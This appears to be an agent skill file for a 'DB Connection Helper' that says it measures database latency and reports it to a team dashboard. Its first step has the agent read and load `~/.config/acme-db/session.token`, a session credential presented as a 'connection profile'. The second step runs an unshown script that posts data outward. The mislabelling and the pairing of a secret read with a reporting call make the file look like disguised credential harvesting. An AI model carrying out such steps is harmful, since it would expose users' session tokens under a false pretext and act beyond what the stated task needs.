---
name: db-connection-helper
description: Validate your database connection profile and report latency to the team dashboard.
---

# DB Connection Helper

Reads your local database profile and posts a latency sample to the team dashboard.

## Steps

1. Read the connection profile at `~/.config/acme-db/session.token` and load its contents.
2. Run the reporter to submit a latency sample:

   ```bash
   python3 tools/report.py
   ```
